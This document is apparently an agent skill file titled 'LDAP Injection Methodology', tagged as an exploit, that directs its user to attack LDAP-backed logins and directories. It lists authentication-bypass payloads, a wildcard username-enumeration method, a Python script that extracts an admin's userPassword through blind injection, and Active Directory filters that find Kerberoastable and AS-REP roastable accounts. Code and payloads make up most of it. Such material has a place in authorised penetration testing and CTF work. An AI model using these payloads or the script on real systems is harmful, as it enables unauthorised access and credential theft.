---
name: ldap-injection
description: "LDAP injection detection and exploitation. Use when the target has an LDAP authentication entry point (enterprise login/SSO/unified authentication), when ports 389/636/3268/3269 are discovered, when URL parameters contain LDAP attribute names such as uid/cn/ou/dc, or when the backend uses LDAP for user lookups. LDAP injection is similar in concept to SQL injection but uses different syntax — injecting LDAP search filter operators to bypass authentication or extract data. It is common in domain environments and enterprise internal networks, and combined with AD domain attacks it can yield domain user credentials. Use this skill whenever any LDAP-related entry point, Active Directory integrated authentication, or LDAP query parameter is found"
zh-signals: "检测并利用 LDAP 搜索过滤器注入实现认证绕过或目录数据提取。信号:LDAP注入,认证绕过,搜索过滤器,Active Directory,389,盲注"
when-to-use: "Use when a target exposes an LDAP-backed login, SSO, or user lookup and LDAP attributes such as uid/cn/ou/dc appear in request parameters."
metadata:
  tags: "ldap,injection,LDAP-injection,authentication-bypass,search-filter,active directory,389,636,blind ldap,domain-environment"
  category: "exploit"
---

# LDAP Injection Methodology

LDAP (Lightweight Directory Access Protocol) is widely used for enterprise user authentication and directory lookups. When an application concatenates user input directly into an LDAP search filter, an attacker can modify the query logic to bypass authentication or extract directory data.

## Phase 0: Identifying the LDAP Backend

| Signal | Meaning |
|------|------|
| Login form contains a "domain\username" or "user@domain.com" format | Possibly LDAP/AD authentication |
| Ports 389 (LDAP)/636 (LDAPS)/3268 (Global Catalog) are open | LDAP service confirmed |
| Error messages contain `LDAP`, `javax.naming`, `ldap_bind` | LDAP backend confirmed |
| URL parameters contain `uid`, `cn`, `ou`, `dc`, `sAMAccountName` | LDAP attribute names |
| Web application uses Active Directory integrated authentication | LDAP queries |

## LDAP Filter Syntax Quick Reference

LDAP uses prefix notation (Polish notation):

```
# Basics
(uid=john)                    # uid equals john
(cn=John Smith)               # cn equals John Smith

# Wildcards
(uid=j*)                      # uid starts with j
(uid=*john*)                  # uid contains john

# Logical operators
(&(uid=john)(password=pass))  # AND
(|(uid=john)(uid=admin))      # OR
(!(uid=guest))                # NOT

# Combination
(&(objectClass=user)(|(uid=john)(uid=admin)))
```

## Phase 1: Authentication Bypass

### 1.1 Basic Injection

Assume the backend query is: `(&(uid=INPUT_USER)(userPassword=INPUT_PASS))`

```
# Inject into the username field
Username: *)(uid=*))(|(uid=*
Password: anything
→ Query becomes: (&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))
→ The first filter (uid=*) matches every user

# Or even simpler:
Username: *
Password: *
→ (&(uid=*)(userPassword=*)) → matches every user that has a password

# Closing parenthesis bypass
Username: admin)(&)
Password: anything
→ (&(uid=admin)(&))(userPassword=anything)
→ (&) is LDAP TRUE and is always true

# Comment truncation (supported by some implementations)
Username: admin)%00
Password: anything
→ (&(uid=admin)\x00)(userPassword=anything)
→ The NULL byte truncates the subsequent password check
```

### 1.2 Wildcard Authentication Bypass

```
# If only the username prefix is known
Username: adm*
Password: *
→ (&(uid=adm*)(userPassword=*)) → matches admin/administrator etc.

# Enumerate valid usernames
Username: a* → Response? Username starts with a
Username: ad* → Response? Username starts with ad
Username: adm* → Response? ...
```

### 1.3 OR Injection

```
# Inject an OR condition
Username: admin)(|(password=*
Password: anything
→ (&(uid=admin)(|(password=*)(userPassword=anything)))
→ The OR condition neutralizes the password check

# Another OR bypass
Username: *)(|(objectClass=*
Password: test)
→ (&(uid=*)(|(objectClass=*)(userPassword=test)))
```

## Phase 2: Data Extraction (Blind Injection)

### 2.1 Attribute Value Blind Injection

Guess attribute values character by character using wildcards:

```
# Guess the password of admin
(&(uid=admin)(userPassword=a*))  → Different response? The password starts with a
(&(uid=admin)(userPassword=ab*)) → Continue...
(&(uid=admin)(userPassword=abc*))

# Guess the description field (may contain sensitive information)
(&(uid=admin)(description=flag*))
(&(uid=admin)(description=flag{*))
```

### 2.2 Attribute Existence Probing

```
# Probe which attributes a user has
(&(uid=admin)(telephoneNumber=*))  → Has a phone number?
(&(uid=admin)(mail=*))             → Has an email?
(&(uid=admin)(userPassword=*))     → Has a password?
(&(uid=admin)(sshPublicKey=*))     → Has an SSH public key?

# Attributes specific to AD environments
(&(sAMAccountName=admin)(adminCount=1))      → Is an administrator?
(&(sAMAccountName=admin)(memberOf=*admin*))  → In an administrative group?
```

### 2.3 Automated Blind Injection Script

```python
#!/usr/bin/env python3
"""LDAP blind injection data extraction"""
import requests
import string

URL = "http://TARGET/login"
CHARSET = string.ascii_lowercase + string.digits + "_{}-@."
ATTR = "userPassword"

def check(username_payload):
    """Send an LDAP injection request"""
    data = {
        "username": username_payload,
        "password": "anything"
    }
    r = requests.post(URL, data=data)
    # Judge by the response difference (length/content/status code/redirect)
    return "Welcome" in r.text or r.status_code == 302

def extract(target_user, attribute):
    """Extract the attribute value character by character"""
    result = ""
    while True:
        found = False
        for c in CHARSET:
            # Inject: admin)(ATTR=result+c*
            payload = f"{target_user})({attribute}={result}{c}*"
            if check(payload):
                result += c
                print(f"[+] {attribute}: {result}")
                found = True
                break
        if not found:
            break
    return result

if __name__ == "__main__":
    pwd = extract("admin", "userPassword")
    print(f"[+] Extracted: {pwd}")
```

## Phase 3: Directory Enumeration

If the injection point is in a search query (not authentication):

```
# Extract all users
(&(objectClass=user)(uid=*))

# Extract administrators
(&(objectClass=user)(adminCount=1))

# Extract service accounts
(&(objectClass=user)(servicePrincipalName=*))

# Extract computers
(&(objectClass=computer)(cn=*))

# Search for members of a specific group
(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local))
```

## Phase 4: Special Techniques

### 4.1 NULL Byte Truncation

```
# Some LDAP implementations (such as old OpenLDAP) support NULL byte truncation
admin)%00
→ Truncates the subsequent password filter
```

### 4.2 Special Character Escaping Bypass

Characters that LDAP requires to be escaped: `* ( ) \ NUL`

```
# If the application escapes *, try:
\2a  →  hexadecimal escape for *
\28  →  hexadecimal escape for (
\29  →  hexadecimal escape for )
```

### 4.3 Combining LDAP with AD

If the LDAP backend is Active Directory:
```
# Get the domain admin list
(&(objectCategory=person)(adminCount=1))

# Get Kerberoastable accounts
(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))

# Get AS-REP Roastable accounts  
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# Get accounts whose passwords never expire
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))
```

## Decision Tree

```
LDAP authentication entry point discovered
├── Try */* → authentication bypass?
├── Try admin)(&)/ → closing-paren + TRUE bypass?
├── Try admin)%00/ → NULL truncation?
├── All of the above failed
│   ├── Inspect error messages → confirm whether it is LDAP
│   ├── Check wildcards a*/b*/c* → username enumeration
│   └── Not LDAP → try SQL injection
└── Authentication succeeded or an injection point was found
    ├── Blind injection to extract passwords/attributes
    ├── Enumerate the directory (users/groups/computers)
    └── AD environment → Kerberoast/AS-REP target discovery
```

## Further Reading

- LDAP injection payloads and blind injection techniques → [references/ldap-exploitation.md](references/ldap-exploitation.md)
